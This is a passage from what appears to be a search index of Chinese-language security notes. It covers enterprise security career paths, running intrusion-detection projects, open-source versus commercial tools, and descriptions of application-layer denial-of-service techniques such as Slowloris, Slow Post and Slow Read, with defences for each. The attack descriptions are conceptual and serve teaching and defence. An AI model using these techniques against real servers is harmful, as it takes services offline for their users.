\uff1a\u5b9a\u597d\u5b97\u65e8\uff0c\u4e0e\"\u8001\u677f\"(\u8fd9\u91cc\u7684\u8001\u677f\u8981\u80fd\u591f\u76f4\u63a5\u6216\u95f4\u63a5\u51b3\u5b9a\u516c\u53f8\u6574\u4f53\u5b89\u5168\u5efa\u8bbe\u7684\u8def\u7ebf\u8def)\u786e\u5b9a\u597d\u77ed\u4e2d\u957f\u671f\u76ee\u6807\uff0c\u8fd9\u91cc\u7684\u6bcf\u4e00\u4e2a\u76ee\u6807\u6211\u4eec\u90fd\u9700\u8981\u9884\u7559\u51fa\u8db3\u591f\u7684\u65f6\u95f4\uff0c\u8981\u8003\u8651\u5230\u5404\u79cd\u53ef\u80fd\u5f71\u54cd\u76ee\u6807\u8fbe\u6210\u7684\u56e0\u7d20\u3002 3+1 \uff1a\u8fd9\u91cc\u76843\u6307\u7684\u662f\"\u4e92\u8054\u7f51\u4f01\u4e1a\u5b89\u5168\u9ad8\u7ea7\u6307\u5357\"\u4e2d\u7b2c\u4e09\u7ae0\u63d0\u5230\u76843\u5f20\u8868\u3002\u8fd9\u91cc\u76841\u6307\u7684\u662f\"\u6743\u9650\u68b3\u7406\"\uff0c\u5982\u679c\u524d\u671f\u4f60\u901a\u8fc7\u6f0f\u6d1e\u6316\u6398\u3001\u6e17\u900f\u6d4b\u8bd5\u6ca1\u6709\u53d1\u73b0\u516c\u53f8\u7684\u4e1a\u52a1\u7cfb\u7edf\u5b58\u5728\u5f88\u5927\u7684\u5b89\u5168\u9690\u60a3\uff0c\u90a3\u4e48\u6211\u4eec\u8fd9\u4e2a\u65f6\u5019\u53ef\u4ee5\u6765\u505a\u8fd9\u4ef6\u4e8b\uff0c\u63a8\u52a8\u6743\u9650\u68b3\u7406\u9700\u8981\u8ddf\u9886\u5bfc\u62a5\u5907\u518d\u8fdb\u884c\uff0c\u8fd9\u662f\u4e00\u4e2a\u4e0d\u80fd\u7acb\u7aff\u89c1\u5f71\u7684\u5b89\u5168\u9879\u76ee\uff0c\u4f46\u662f\u505a\u597d\u5b83\u6211\u4eec\u80fd\u591f\u53d1\u73b0\u5f88\u591a\u4f01\u4e1a\u4e2d\u53ef\u80fd\u5b58\u5728\u7684\u98ce\u9669\u70b9\uff0c\u91cd\u70b9\u5173\u6ce8\u5982\u4e0b\u51e0\u4e2a\u65b9\u9762\uff1a \u4ece\u5458\u5de5\u7684\u89d2\u5ea6\u51fa\u53d1 \uff1a\u6bcf\u4e2a\u5458\u5de5\u62e5\u6709\u54ea\u4e9b\u6743\u9650\uff1f\u6bcf\u4e2a\u62e5\u6709\u7684\u6743\u9650\u662f\u5426\u5408\u7406\uff1f \u4ece\u4e1a\u52a1\u7cfb\u7edf\u7684\u89d2\u5ea6\u51fa\u53d1 \uff1a\u4e1a\u52a1\u7cfb\u7edf\u7684\u7528\u6237\u7fa4\u4f53\u662f\u4ec0\u4e48\uff1fACL\u662f\u5426\u6b63\u786e\uff1f\u62e5\u6709\u7cfb\u7edf\u6743\u9650\u7684\u662f\u54ea\u4e9b\u4eba\uff1f\uff08\u8fd9\u4e2a\u5730\u65b9\u53ef\u4ee5\u4e0e\u7b2c\u4e00\u4e2a\u89d2\u5ea6\u8fdb\u884c\u4ea4\u53c9\u5bf9\u6bd4\uff0c\u67e5\u770b\u4e24\u8005\u662f\u5426\u6709\"\u6f0f\u70b9\"\uff09 \u4ece\u6743\u9650\u8bbe\u8ba1\u7684\u89d2\u5ea6\u51fa\u53d1 \uff1a\u5982\u679c\u7cfb\u7edf\u62e5\u6709\u8d85\u7ea7\u7ba1\u7406\u5458\u3001\u7ba1\u7406\u5458\u3001\u5ba1\u6838\u5458\u3001\u5ba2\u670d4\u4e2a\u89d2\u8272\uff0c\u90a3\u4e48\u662f\u5426\u5b58\u5728\u8d8a\u6743\u64cd\u4f5c\u7684\u89d2\u8272\u7528\u6237\uff1f","title":"2.\u4ece\u767d\u5e3d\u5b50\u8f6c\u578b\u7684\u601d\u8def"},{"location":"miscellaneous/jsrc-1/#3","text":"\u4efb\u4f55\u4eba\u90fd\u4e0d\u662f\u4e00\u5f00\u59cb\u5c31\u7cbe\u901a\u5404\u79cd\u6280\u80fd\uff0c\u6211\u4eec\u5e94\u8be5\u505a\u7684\u5c31\u662f\u627e\u5bf9\u5408\u7406\u7684\u8def\u7ebf\u5e76\u575a\u6301\u5b66\u4e60\u4e0b\u53bb\uff0c\u7ec8\u6709\u4e00\u5929\u80fd\u591f\u5b66\u6709\u6240\u6210\uff0c\u5f53\u7136\u6709\u4e00\u4e2a\u5408\u9002\u7684\u5b66\u4e60\u8ba1\u5212\u5f88\u91cd\u8981\uff1b \u9009\u62e9\u9002\u5408\u81ea\u5df1\u7684\u8def \uff1a\u7532\u65b9\u4f01\u4e1a\u5b89\u5168\u5728\u7b2c\u4e00\u4e2a\u95ee\u9898\u56de\u7b54\u4e86\u6709\u5f88\u591a\u5206\u7c7b\uff0c\u6bcf\u4e2a\u4eba\u4e5f\u6709\u81ea\u5df1\u64c5\u957f\u7684\u5730\u65b9\uff0c\u5982\u679c\u4f60\u5bf9\u653b\u9632\u6280\u672f\u5f88\u611f\u5174\u8da3\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u671d\u7740\u7ea2\u84dd\u5bf9\u6297\u7684\u65b9\u5411\u8d70\uff1b\u5982\u679c\u4f60\u5bf9\u64cd\u4f5c\u7cfb\u7edf\u6bd4\u8f83\u654f\u611f\u4e5f\u53ef\u4ee5\u52aa\u529b\u94bb\u7814\u4e3b\u673a\u5b89\u5168\u3001\u5e94\u6025\u54cd\u5e94\u7b49\u3002 \u5b66\u4e60\u7684\u65b9\u5f0f \uff1a\u9605\u8bfb\u6587\u6863\uff0c\u5173\u4e8e\u7532\u65b9\u5b89\u5168\u6709\u592a\u591a\u592a\u591a\u7684\u8d44\u6599\u53ef\u4ee5\u4f9b\u6211\u4eec\u53bb\u5b66\u4e60\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u4f4e\u4e00\u70b9\u7684\u57fa\u7840\u4e0a\u627e\u5230\u8fd9\u4e9b\u6587\u6863\u8fdb\u5165\u6df1\u5165\u89e3\u8bfb\u79ef\u7d2f\u6210\u4e3a\u81ea\u5df1\u7684\u77e5\u8bc6\uff1b\u53c2\u52a0\u6c99\u9f99\u6216\u8bb2\u5ea7\uff0c\u5bf9\u4e8e\u5cf0\u4f1a\u3001\u6c99\u9f99\u6216\u8bb2\u5ea7\u53ef\u4ee5\u4f18\u5148\u786e\u5b9a\u662f\u5426\u6709\u81ea\u5df1\u559c\u6b22\u7684\u8bae\u9898\uff0c\u4e13\u5fc3\u53bb\u8046\u542c\u5206\u4eab\u8005\u7684\u8bb2\u8bc9\uff0c\u4e00\u6b21\u4f1a\u8bae\u80fd\u591f\u771f\u6b63\u5b66\u52301-3\u4e2a\u8bae\u9898\u7684\u7cbe\u9ad3\u5c31\u8db3\u591f\u4e86\uff1b\u4e92\u76f8\u4ea4\u6d41\uff0c\u4e0d\u540c\u516c\u53f8\u5728\u4e0d\u540c\u5b89\u5168\u4e0a\u53ef\u80fd\u6709\u4e0d\u540c\uff0c\u4f46\u4e07\u53d8\u4e0d\u79bb\u5176\u5b97\u89e3\u51b3\u95ee\u9898\u7684\u672c\u8d28\u601d\u8def\u4e5f\u884c\u8fd8\u662f\u4e00\u81f4\u7684\uff0c\u6240\u4ee5\u9002\u5f53\u4e0e\u540c\u884c\u4e1a\u751a\u81f3\u8de8\u884c\u4e1a\u7684\u5b89\u5168\u670b\u53cb\u8fdb\u884c\u63a2\u8ba8\u4e5f\u662f\u5feb\u901f\u5b66\u4e60\u7684\u65b9\u5f0f\u3002 \u7eb8\u4e0a\u5f97\u6765\u7ec8\u89c9\u6d45 \u7edd\u77e5\u6b64\u4e8b\u8981\u8eac\u884c \uff1a\u5b9e\u6218\u7ecf\u9a8c\uff0c\u8d44\u6599\u770b\u7684\u518d\u591a\uff0c\u4e0e\u4eba\u4e89\u8bba\u7684\u53e3\u82e5\u60ac\u6cb3\u90fd\u4e0d\u5982\u81ea\u5df1\u5b9e\u6218\u4e00\u6b21\uff0c\u5b89\u5168\u9879\u76ee\u53ea\u6709\u5728\u63a8\u52a8\u8fc7\u7a0b\u4e2d\u4e0d\u65ad\u4ece\u4e00\u4e2a\u5751\u722c\u5230\u53e6\u5916\u4e00\u4e2a\u5751\uff0c\u6211\u4eec\u7684\u6280\u80fd\u624d\u80fd\u5feb\u901f\u6210\u957f\u3002\u4e0d\u8981\u6015\u8e29\u5751\uff0c\u5982\u679c\u4f60\u7684\u9879\u76ee\u63a8\u52a8\u7684\u4e00\u5e06\u98ce\u987a\uff0c\u4e5f\u8bb8\u662f\u4f60\u6ca1\u6709\u8fdb\u884c\u5145\u5206\u7684\u95ee\u9898\u9884\u4f30\u3002 \u5e73\u53f0\u9009\u62e9 \uff1a\u5927\u5e73\u53f0\u4e0e\u5c0f\u5e73\u53f0\u5404\u6709\u4f18\u52bf\uff0c\u4e5f\u5404\u6709\u52a3\u52bf\u3002\u5927\u5e73\u53f0\u7684\u4f18\u52bf\u662f\u89c6\u91ce\u4ee5\u53ca\u4f60\u6240\u80fd\u9047\u5230\u7684\u6d41\u91cf\u3001\u573a\u666f\u90fd\u4e0d\u662f\u5c0f\u516c\u53f8\u80fd\u7ed9\u4f60\u7684\uff1b\u5c0f\u516c\u53f8\u7684\u4f18\u52bf\u662f\u4f60\u80fd\u63a5\u89e6\u5230\u9762\u8981\u5e7f\u4e00\u4e9b\uff0c\u4f46\u662f\u5bb9\u6613\u6742\u800c\u4e0d\u7cbe\uff0c\u4f46\u662f\u5982\u679c\u4f60\u80fd\u5408\u7406\u5206\u914d\u4f60\u7684\u7cbe\u529b\u4e5f\u662f\u6ca1\u6709\u95ee\u9898\u7684\u3002","title":"3.\u4f01\u4e1a\u5b89\u5168\u5efa\u8bbe\u7684\u6280\u80fd\u6210\u957f"},{"location":"miscellaneous/jsrc-1/#4","text":"\u56fd\u5185\u5927\u90e8\u5206\u4f01\u4e1a\u63a8\u52a8\u5b89\u5168\u9879\u76ee\u662f\u5408\u89c4\u9a71\u52a8\u548c\u4e8b\u4ef6\u9a71\u52a8\uff0c\u90a3\u4e48\u6211\u4eec\u5728\u63a8\u52a8\u5b89\u5168\u9879\u76ee\u7684\u8fc7\u7a0b\u4e2d\u5e94\u8be5\u5982\u4f55\u6765\u505a\uff1a","title":"4.\u5982\u4f55\u505a\u597d\u5b89\u5168\u9879\u76ee"},{"location":"miscellaneous/jsrc-1/#5","text":"\u4e3a\u4ec0\u4e48\u8fd9\u4e48\u505a\uff1f\u80cc\u666f\uff08\u6211\u4eec\u9047\u5230\u4e86\u4ec0\u4e48\u6837\u7684\u56f0\u96be\u5bfc\u81f4\u6211\u4eec\u8981\u8fd9\u4e48\u505a\uff09 \u505a\u4e86\u4ee5\u540e\u7684\u597d\u5904\u662f\u4ec0\u4e48\uff1f\u76ee\u6807 \u8c01\u6765\u505a\uff0c\u600e\u4e48\u505a\uff0c\u4ec0\u4e48\u65f6\u95f4\u505a\uff1f\u8fc7\u7a0b \u505a\u8fd9\u4ef6\u4e8b\u53ef\u80fd\u9047\u5230\u7684\u95ee\u9898\u6709\u54ea\u4e9b\uff1f\u9884\u4f30\u98ce\u9669 \u662f\u5426\u662f\u6700\u4f18\u7684\u89e3\u51b3\u65b9\u6848\uff1f\u5982\u679c\u4e0d\u662f\u884c\u4e1a\u6700\u4f18\u89e3\u51b3\u65b9\u6848\uff0c\u6211\u4eec\u4e3a\u4ec0\u4e48\u8981\u9009\u62e9\u8fd9\u4e2a\u65b9\u6848","title":"\u505a\u9879\u76ee\u76845\u8981\u7d20"},{"location":"miscellaneous/jsrc-1/#_2","text":"\u505a\u597d\u9879\u76ee\u9884\u6848\u540e\uff0c\u8981\u5c06\u6574\u4e2a\u9879\u76ee\u7684\u63a8\u52a8\u8fc7\u7a0b\u62c6\u5206\u6210\u591a\u4e2a\u9636\u6bb5\uff0c\u5b9a\u597d\u6bcf\u4e2a\u9636\u6bb5\u7684\u65f6\u95f4\u8282\u70b9\uff0c\u6bcf\u4e2a\u9636\u6bb5\u7684\u65f6\u95f4\u8282\u70b9\u9700\u8981\u9884\u7559\u8db3\u591f\u7684\u65f6\u95f4\u3002 \u5728\u6bcf\u4e00\u4e2a\u65f6\u95f4\u8282\u70b9\u8fdb\u884c\u603b\u7ed3\u4f1a\u8bae\uff0c\u4e0a\u4e00\u9636\u6bb5\u7684\u5b8c\u6210\u60c5\u51b5\uff0c\u5982\u679c\u672a\u5b8c\u6210\u539f\u56e0\u662f\u4ec0\u4e48\uff1f\u672c\u9636\u6bb5\u7684\u9884\u671f\u7b49\u3002","title":"\u9879\u76ee\u63a8\u52a8"},{"location":"miscellaneous/jsrc-1/#_3","text":"\u63a8\u52a8\u4e3b\u673a\u5165\u4fb5\u68c0\u6d4b\u9879\u76ee\uff1a \u80cc\u666f\uff1a\u591a\u6b21\u9047\u5230\u4e86\u4e3b\u673a\u88ab\u5165\u4fb5\u6316\u77ff\u7684\u5b89\u5168\u4e8b\u4ef6\uff1b \u76ee\u6807\uff1a\u53ca\u65f6\u53d1\u73b0\u4e3b\u673a\u88ab\u653b\u51fb\u6216\u88ab\u5165\u4fb5\uff1b \u8fc7\u7a0b\uff1a \u8c03\u7814\uff1a \u8c03\u7814\u5185\u5bb9\uff1a\u529f\u80fd\u3001\u5bf9\u7cfb\u7edf\u7684\u6027\u80fd\u5f71\u54cd\u3001\u5b89\u5168\u6027\u3001\u90e8\u7f72\u96be\u6613\u7a0b\u5ea6\u3001\u7ba1\u7406\u96be\u6613\u7a0b\u5ea6\u3001\u53ef\u6269\u5c55\u6027 \u8c03\u7814\u4ea7\u54c1\uff1a\u5f00\u6e90\uff08ossec\u3001wazuh\u3001osquery\u3001\u9a6d\u9f99\uff09\u3001\u5546\u4e1a\uff08\u5b89\u9a91\u58eb\uff09 \u90e8\u7f72\u65b9\u5f0f\uff1a \u81ea\u52a8\u5316\u90e8\u7f72\u5b9e\u73b0\u65b9\u6848\u3002 \u8c01\u6765\u90e8\u7f72\uff1a \u5b89\u5168\u8d1f\u8d23\u5165\u4fb5\u68c0\u6d4b\u670d\u52a1\u7aef\uff0c\u670d\u52a1\u5668\u7cfb\u7edf\u521d\u59cb\u5316\u65f6\u90e8\u7f72\u5165\u4fb5\u68c0\u6d4b\u5ba2\u6237\u7aef\u3002 \u65f6\u95f4\u8282\u70b9\uff1a \u6d4b\u8bd5-- \u6d4b\u8bd5\u73af\u5883-- \u975e\u6838\u5fc3\u4e1a\u52a1\u73af\u5883-- \u6838\u5fc3\u4e1a\u52a1\u73af\u5883\uff08\u6839\u636e\u670d\u52a1\u5668\u6570\u91cf\u6765\u786e\u5b9a\u65f6\u95f4\u8282\u70b9\uff09\u3002 \u98ce\u9669\u9884\u4f30\uff1a\u5ba2\u6237\u7aef\u5bf9\u670d\u52a1\u5668\u7cfb\u7edf\u6027\u80fd\u4ea7\u751f\u5f71\u54cd\u5982\u4f55\u5feb\u901f\u5378\u8f7d\uff1b\u8bef\u62a5\u592a\u591a\u5982\u4f55\u5904\u7406\uff1b\u2026\u2026 \u5728\u63a8\u52a8\u5b89\u5168\u9879\u76ee\u4e0e\u5176\u5b83\u7684\u4e1a\u52a1\u9879\u76ee\u4e0d\u4e00\u6837\u7684\u662f\uff0c\u90e8\u5206\u5b89\u5168\u9879\u76ee\u4f1a\u5bf9\u516c\u53f8\u7684\u4e1a\u52a1\u7cfb\u7edf\u4ea7\u751f\u5f71\u54cd\uff0c\u6bd4\u5982\uff1a\u4e0aWAF\u9700\u8981\u8003\u8651\u5bf9\u4e1a\u52a1\u9020\u6210\u7684\u5ef6\u65f6\uff0cWAF\u80fd\u627f\u53d7\u7684\u6700\u5927\u8bbf\u95ee\u91cf\uff1b\u626b\u63cf\u5668\u9700\u8981\u8003\u8651\u4ea7\u751f\u7684\u810f\u6570\u636e\uff0c\u90e8\u5206\u626b\u63cf\u884c\u4e3a\u4f1a\u9020\u6210DoS\u7684\u6548\u679c\u7b49\u3002","title":"\u4e3e\u4e2a\u6817\u5b50"},{"location":"miscellaneous/jsrc-1/#5_1","text":"\u4e00\u53e5\u8bdd\u603b\u7ed3\uff1a\u6709\u94b1\u4e70\u4ea7\u54c1\u3001\u6ca1\u94b1\u5c31\u5f00\u6e90\u3001\u4eba\u5c11\u76f4\u63a5\u7528\uff0c\u4eba\u591a\u81ea\u5df1\u6539\u3002 \u5f88\u591a\u4eba\u5b58\u5728\u8bef\u533a\uff1a\u5f00\u6e90\u633a\u597d\u7684\uff0c\u8282\u7ea6\u94b1\u4e0d\u7528\u627e\u8001\u677f\u8981\u9884\u7b97\uff0c\u5176\u5b9e\u5f00\u6e90\u6709\u5f88\u591a\u95ee\u9898\uff1a \u5b89\u5168\u6027 \uff1a\u5b89\u5168\u5f00\u6e90\u4ea7\u54c1\u672c\u8eab\u7684\u5b89\u5168\u6027\uff0c\u6211\u4eec\u5728\u4f7f\u7528\u5f00\u6e90\u4ea7\u54c1\u7684\u65f6\u5019\u5927\u90e8\u5206\u60c5\u51b5\u4e0b\u90fd\u662f\u6ca1\u6709\u5bf9\u4ea7\u54c1\u672c\u8eab\u8fdb\u884c\u5b89\u5168\u6027\u5ba1\u6838\uff1b \u6301\u7eed\u7ef4\u62a4 \uff1a\u76ee\u524d\u56fd\u5185\u5f00\u6e90\u4ea7\u54c1\u5448\u73b0\u51fa\u4e00\u4e2a\u6bd4\u8f83\u4e25\u91cd\u95ee\u9898\u5c31\u662f\u6ca1\u6709\u957f\u65f6\u95f4\u7ef4\u62a4\uff0c\u5982\u679c\u6211\u4eec\u4f7f\u7528\u56fd\u5185\u7684\u5f00\u6e90\u4ea7\u54c1\uff0c\u540e\u7eed\u8fd8\u662f\u9700\u8981\u4e8c\u6b21\u5f00\u53d1\u3002 \u6210\u672c\u9ad8 \uff1a\u6210\u672c=\u91c7\u8d2d\u6210\u672c+\u8fd0\u7ef4\u6210\u672c+\u66f4\u65b0\u6210\u672c\uff0c\u5f00\u6e90\u4ea7\u54c1\u6ca1\u6709\u91c7\u8d2d\u6210\u672c\uff0c\u4f46\u662f\u8fd0\u7ef4\u6210\u672c\u4e0e\u66f4\u65b0\u6210\u672c\u8fdc\u8fdc\u9ad8\u4e8e\u5546\u4e1a\u4ea7\u54c1\uff1b \u517c\u5bb9\u6027 \uff1a\u6211\u4eec\u53ef\u80fd\u9009\u62e9\u4e86\u4e0d\u6b62\u4e00\u6b3e\u5f00\u6e90\u4ea7\u54c1\uff0c\u5982\u4f55\u628a\u8fd9\u4e9b\u5b89\u5168\u4ea7\u54c1\u96c6\u6210\u8d77\u6765\u662f\u6211\u4eec\u5934\u75bc\u7684\u4e8b\u60c5\uff1b \u90a3\u4e48\u5546\u4e1a\u4ea7\u54c1\u5982\u4f55\u4e70\uff1f\u4e2a\u4eba\u610f\u89c1\uff1a\u76ee\u524d\u516c\u53f8\u6240\u5b58\u5728\u7684\u98ce\u9669\u6025\u9700\u4e00\u6b3e\u4ea7\u54c1\u6765\u89e3\u51b3\uff1b\u80fd\u5e26\u6765\u76f4\u63a5\u6216\u95f4\u63a5\u7684\u5b89\u5168\u80fd\u529b\u63d0\u5347\u3002\u8fd9\u90fd\u662f\u9488\u5bf9\u5b89\u5168\u7ecf\u8d39\u5e76\u4e0d\u5145\u8db3\uff0c\u4e1a\u5185\u8fd8\u6709\u4e00\u79cd\u9a71\u52a8\u5b89\u5168\u9879\u76ee\u7684\u4e3a\u6d88\u8d39\u578b\u9a71\u52a8\uff0c\u4ed6\u4eec\u4e0d\u5b58\u5728\u8fd9\u4e9b\uff0c\u4e70\u5c31\u597d\uff01 \u5b89\u5168\u5c31\u50cf\u662f\u764c\u75c7\u4e00\u6837\uff0c\u5bf9\u513f\u4e8c\u8005\u800c\u8a00\u53ca\u65e9\u53d1\u73b0\u95ee\u9898\u5747\u80fd\u51cf\u5c11\u5176\u9020\u6210\u7684\u7834\u574f\uff0c\u4f46\u80fd\u5426\u627e\u5230\u5b8c\u7f8e\u89e3\u51b3\u65b9\u6848\u662f\u4e2a\u7591\u95ee\u3002--\u9c81\u8fea-\u9f50\u5170\u5c3c","title":"5.\u5f00\u6e90\u8fd8\u662f\u5546\u4e1a"},{"location":"network_security/cc/","text":"CC\u5e94\u7528\u5c42\u62d2\u7edd\u670d\u52a1\u653b\u51fb Chanllenge Collapsar\uff1aCC\u5c31\u662fDDoS\u7684\u4e00\u79cd\u3002 CC\u653b\u51fb\u5206\u7c7b Get-Flood \u76f4\u63a5\u5bf9\u8f83\u4e3a\u6d88\u8017\u8d44\u6e90\u7684URL\u8fdb\u884c\u5927\u91cf\u7684\u8bf7\u6c42\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u591a\u4e2aURL\u5e76\u53d1\u3001\u5355\u4e00URL\u5e76\u53d1\u8bf7\u6c42\u3001\u968f\u673aURL\u8bf7\u6c42\u7b49\u3002 SlowLoris \u4e5f\u79f0\u4e3aslow headers\uff0c\u653b\u51fb\u8005\u59cb\u7ec8\u6784\u9020\u4e0d\u5b8c\u6574\u7684http header\u53d1\u9001\uff0c\u540c\u65f6\u8fd8\u95f4\u9694\u4e00\u5b9a\u65f6\u95f4\u518d\u53d1\u9001\u6570\u636e\uff0c\u5bfc\u81f4\u670d\u52a1\u5668\u4e00\u76f4\u5904\u4e8e\u7b49\u5f85\u72b6\u6001\u3002 Slow Post \u4e5f\u79f0\u4e3aslow body\uff0c\u653b\u51fb\u7684\u91cd\u70b9\u5728POST\u6570\u636e\u4e0a\uff0c\u901a\u8fc7\u5c06HTTP Header\u4e2d\u7684Content-Length\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u8f83\u5927\u7684\u503c\uff0c\u540c\u65f6\u8fd8\u95f4\u9694\u4e00\u5b9a\u65f6\u95f4\u518d\u53d1\u9001\u6570\u636e\uff0c\u5bfc\u81f4\u670d\u52a1\u5668\u4e00\u76f4\u5904\u4e8e\u7b49\u5f85\u72b6\u6001\u4e2d\u3002 Slow Read \u628awindow\u7a97\u53e3\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u975e\u5e38\u5c0f\u7684\u503c\uff0c\u8ba9\u670d\u52a1\u5668\u59cb\u7ec8\u51c6\u5907\u56de\u5e94\u6570\u636e\u3002 HashDos CC\u653b\u51fb\u9632\u5fa1 \u5224\u65adUA\u5b57\u6bb5\uff08\u4e0d\u53ef\u9760\uff0c\u53ef\u4ee5\u968f\u610f\u6784\u9020\u7ed5\u8fc7\uff09\uff1b \u7f51\u9875\u4e2d\u5d4c\u5165JS\u4ee3\u7801\uff08\u4e0d\u53ef\u9760\uff0c\u722c\u866b\u53ef\u4ee5\u643a\u5e26\u6d4f\u89c8\u5668\u5f15\u64ce\uff0c\u6216\u8005\u52a0\u8f7dJS\uff09\uff1b \u9488\u5bf9IP+Cookie\u9650\u5236\u8bbf\u95ee\u9891\u7387\uff08\u4e0d\u53ef\u9760\uff0cCookie\u53ef\u4ee5\u4f2a\u9020\uff0cIP\u5b58\u5728\u4ee3\u7406\u6c60\u95ee\u9898\uff09\uff1b \u5173\u95edApache\u6700\u5927\u8fde\u63a5\u6570\u7b49\uff0c\u5408\u7406\u914d\u7f6e\u4e2d\u95f4\u4ef6\uff0c\u7f13\u89e3DDoS\u653b\u51fb\uff1b \u9875\u9762\u4e2d\u6dfb\u52a0\u9a8c\u8bc1\u7801\uff1b \u5408\u7406\u4f18\u5316\u4ee3\u7801\uff0c\u5408\u7406\u4f7f\u7528\u7f13\u5b58\u6280\u672f\uff0c\u51cf\u5c11\u6570\u636e\u5e93\u7684\u8bfb\u5199\u64cd\u4f5c\uff1b","title":"CC\u5e94\u7528\u5c42\u62d2\u7edd\u670d\u52a1\u653b\u51fb"},{"location":"network_security/cc/#cc","text":"Chanllenge Collapsar\uff1aCC\u5c31\u662fDDoS\u7684\u4e00\u79cd\u3002","title":"CC\u5e94\u7528\u5c42\u62d2\u7edd\u670d\u52a1\u653b\u51fb"},{"location":"network_security/cc/#cc_1","text":"","title":"CC\u653b\u51fb\u5206\u7c7b"},{"location":"network_security/cc/#get-flood","text":"\u76f4\u63a5\u5bf9\u8f83\u4e3a\u6d88\u8017\u8d44\u6e90\u7684URL\u8fdb\u884c\u5927\u91cf\u7684\u8bf7\u6c42\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u591a\u4e2aURL\u5e76\u53d1\u3001\u5355\u4e00URL\u5e76\u53d1\u8bf7\u6c42\u3001\u968f\u673aURL\u8bf7\u6c42\u7b49\u3002","title":"Get-Flood"},{"location":"network_security/cc/#slowloris","text":"\u4e5f\u79f0\u4e3aslow headers\uff0c\u653b\u51fb\u8005\u59cb\u7ec8\u6784\u9020\u4e0d\u5b8c\u6574\u7684http header\u53d1\u9001\uff0c\u540c\u65f6\u8fd8\u95f4\u9694\u4e00\u5b9a\u65f6\u95f4\u518d\u53d1\u9001\u6570\u636e\uff0c\u5bfc\u81f4\u670d\u52a1\u5668\u4e00\u76f4\u5904\u4e8e\u7b49\u5f85\u72b6\u6001\u3002","title":"SlowLoris"},{"location":"network_security/cc/#slow-post","text":"\u4e5f\u79f0\u4e3aslow body\uff0c\u653b\u51fb\u7684\u91cd\u70b9\u5728POST\u6570\u636e\u4e0a\uff0c\u901a\u8fc7\u5c06HTTP Header\u4e2d\u7684Content-Length\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u8f83\u5927\u7684\u503c\uff0c\u540c\u65f6\u8fd8\u95f4\u9694\u4e00\u5b9a\u65f6\u95f4\u518d\u53d1\u9001\u6570\u636e\uff0c\u5bfc\u81f4\u670d\u52a1\u5668\u4e00\u76f4\u5904\u4e8e\u7b49\u5f85\u72b6\u6001\u4e2d\u3002","title":"Slow Post"},{"location":"network_security/cc/#slow-read","text":"\u628awindow\u7a97\u53e3\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u975e\u5e38\u5c0f\u7684\u503c\uff0c\u8ba9\u670d\u52a1\u5668\u59cb\u7ec8\u51c6\u5907\u56de\u5e94\u6570\u636e\u3002","title":"Slow Read"},{"location":"network_security/cc/#hashdos","text":"","title":"HashDos"},{"location":"network_security/cc/#cc_2","text":"\u5224\u65adUA\u5b57\u6bb5\uff08\u4e0d\u53ef\u9760\uff0c\u53ef\u4ee5\u968f\u610f\u6784\u9020\u7ed5\u8fc7\uff09\uff1b \u7f51\u9875\u4e2d\u5d4c\u5165JS\u4ee3\u7801\uff08\u4e0d\u53ef\u9760\uff0c\u722c\u866b\u53ef\u4ee5\u643a\u5e26\u6d4f\u89c8\u5668\u5f15\u64ce\uff0c\u6216\u8005\u52a0\u8f7dJS\uff09\uff1b \u9488\u5bf9IP+Cookie\u9650\u5236\u8bbf\u95ee\u9891\u7387\uff08\u4e0d\u53ef\u9760\uff0cCookie\u53ef\u4ee5\u4f2a\u9020\uff0cIP\u5b58\u5728\u4ee3\u7406\u6c60\u95ee\u9898\uff09\uff1b \u5173\u95edApache\u6700\u5927\u8fde\u63a5\u6570\u7b49\uff0c\u5408\u7406\u914d\u7f6e\u4e2d\u95f4\u4ef6\uff0c\u7f13\u89e3DDoS\u653b\u51fb\uff1b \u9875\u9762\u4e2d\u6dfb\u52a0\u9a8c\u8bc1\u7801\uff1b \u5408\u7406\u4f18\u5316\u4ee3\u7801\uff0c\u5408\u7406\u4f7f\u7528\u7f13\u5b58\u6280\u672f\uff0c\u51cf\u5c11\u6570\u636e\u5e93\u7684\u8bfb\u5199\u64cd\u4f5c\uff1b","title":"CC\u653b\u51fb\u9632\u5fa1"},{"location":"network_security/dos_ddos/","text":"DoS\u4e0eDDoS\u62d2\u7edd\u670d\u52a1\u653b\u51fb DoS(Denial of Service)\uff0c\u62d2\u7edd\u670d\u52a1\uff1a\u901a\u8fc7\u5bf9\u4e3b\u673a\u7279\u5b9a\u6f0f\u6d1e\u7684\u5229\u7528\u653b\u51fb\u5bfc\u81f4\u7f51\u7edc\u6808\u5931\u6548\u3001\u7cfb\u7edf\u5954\u6e83\u3001\u4e3b\u673a\u6b7b\u673a\u7b49\u800c\u65e0\u6cd5\u63d0\u4f9b\u6b63\u5e38\u7684\u7f51\u7edc\u670d\u52a1\u529f\u80fd\uff0c\u4ece\u800c\u9020\u6210\u62d2\u7edd\u670d\u52a1\u3002 DDoS(Distributed Denial of Service)\uff0c\u5206\u5e03\u5f0f\u62d2\u7edd\u670d\u52a1\uff1a\u901a\u8fc7\u5f88\u591a\"\u50f5\u5c38\u4e3b\u673a\"\u5411\u53d7\u5bb3\u4e3b\u673a\u53d1\u9001\u5927\u91cf\u770b\u4f3c\u6b63\u5e38\u7684\u7f51\u7edc\u5305\uff0c\u4ece\u800c\u9020\u6210\u7f51\u7edc\u963b\u585e\u6216\u670d\u52a1\u5668\u8d44\u6e90\u8017\u5c3d\u800c\u5bfc\u81f4\u62d2\u7edd\u670d\u52a1\u3002 DoS\u4e0eDDoS\u5206\u7c7b \u7f51\u7edc\u5c42 UDP-Flood 